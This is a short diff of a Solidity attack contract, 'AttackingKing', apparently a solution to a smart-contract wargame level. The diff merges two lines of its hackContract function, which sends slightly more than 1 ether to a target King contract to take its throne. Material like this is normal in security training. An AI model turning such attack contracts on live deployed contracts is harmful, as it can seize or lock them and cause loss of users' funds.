@@ -10,8 +10,7 @@ contract AttackingKing {
     }
 
     function hackContract() external {
-        King king = King(payable(contractAddress));
-        address(king).call{value: 1000000000000000001 wei}("");
+        address(King(payable(contractAddress))).call{value: 1000000000000000001 wei}("");
     }
 
     receive() external payable {
